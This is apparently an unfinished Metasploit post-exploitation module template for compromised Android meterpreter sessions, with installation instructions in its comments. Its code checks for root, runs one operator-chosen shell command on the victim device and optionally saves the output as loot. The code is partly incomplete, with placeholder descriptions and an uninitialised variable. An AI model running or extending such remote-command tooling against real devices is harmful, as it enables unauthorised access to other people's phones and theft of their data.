##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# [ android_aux.rb ]
# Author: pedr0 Ubuntu [r00t-3xp10it]
# tested on:
# P.O.C https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC[ERB]/metasploit-API/writing_a_linux_post_module_from_scratch.md
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This module ...
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on     => set SESSION 3
# Store dumped data to msf4/loot folder?       => set STORE_LOOT true
# Agressive system fingerprints scan?          => set EXEC_COMMAND ls Download
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/gather/android_aux.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gather/android_aux.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/gather
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > use post/linux/gather/android_aux
# msf post(android_aux) > info
# msf post(android_aux) > show options
# msf post(android_aux) > show advanced options
# msf post(android_aux) > set [option(s)]
# msf post(android_aux) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -q -x 'reload_all'
##





#
# Metasploit Module librarys to load ..
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

  include Msf::Post::File



#
# The 'def initialize()' funtion ..
# Building Metasploit/Armitage info GUI/CLI description
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'android auxiliary post-module',
                        'Description'   => %q{
                                        This module...
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author :D
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => '20 jun 2018',
                        'Platform'       => 'android',
                        'Arch'           => ARCH_DALVIK,
                        'Privileged'     => 'true',  # root privileges required?
                        'Targets'        =>
                                [
                                         [ 'android' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts android targets
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/RzP3DM' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://rapid7.github.io/metasploit-framework/api/' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('STORE_LOOT', [false, 'Store dumped data into ~/.msf4/loot folder?', false]),
                                OptString.new('EXEC_COMMAND', [true, 'Input one bash command to be executed remotely'])
                        ], self.class)

        end



#
# The 'def run()' funtion ..
# Running sellected modules against session target.
#
def run

  session = client
  #
  # Variable declarations (msf API calls)
  #
  runtor = client.sys.config.getuid
  runsession = client.session_host
  directory = client.fs.dir.pwd
  #
  # draw module banner ..
  #
  print_line("+-------------------------------------+")
  print_line("|    ANDROID AUXILIARY POST-MODULE    |")
  print_line("| Author : r00t-3xp10it (ssa-redteam) |")
  print_line("+-------------------------------------+")
  print_line("")
  print_line("    Running on session  : #{datastore['SESSION']}")
  print_line("    Target IP addr      : #{runsession}")
  print_line("    Payload directory   : #{directory}")
  print_line("    Client UID          : #{runtor}")
  print_line("")
  print_line("")
    #
    # Check if we are running in an higth integrity context (root)
    #
    id = cmd_exec('id')
    unless id =~ /root/
      print_error("[ABORT]: This module requires root permissions")
      return
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_good("Running module against: #{runsession}")
      Rex::sleep(0.5)
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end

      #
      # Single_command to execute remotely (user inputs) ..
      # if sellected previous in advanced options (set EXEC_COMMAND ls Download) ..
      #
      exec_comm = datastore['EXEC_COMMAND']
        # check if single_command option its configurated ..
        if not exec_comm.nil?
          print_status("Executing: #{exec_comm}")
          Rex::sleep(0.5)
          # bash command to be executed remotely ..
          single_comm = cmd_exec("#{exec_comm}")
            #
            # store data into a local variable (data_dump) ..
            # to be able to write the logfile and display the outputs ..
            #
            data_dump << "Executing: #{exec_comm}\n"
            data_dump << single_comm
            data_dump << "\n\n"
            # print data onscreen
            print_line(data_dump)
            Rex::sleep(0.2)
        end

      #
      # Store (data_dump) contents into msf loot folder? (local) ..
      # IF sellected previous in advanced options (set STORE_LOOT true) ..
      #
      if datastore['STORE_LOOT'] == true
        print_good("Session logfile stored in: ~/.msf4/loot folder")
        store_loot("android_auxiliary", "text/plain", session, data_dump, "android_auxiliary.txt", "android_auxiliary")
      end


   #
   # end of the 'def run()' funtion (exploit code) ..
   #
   end
#
# exit module execution (_EOF) ..
#
end
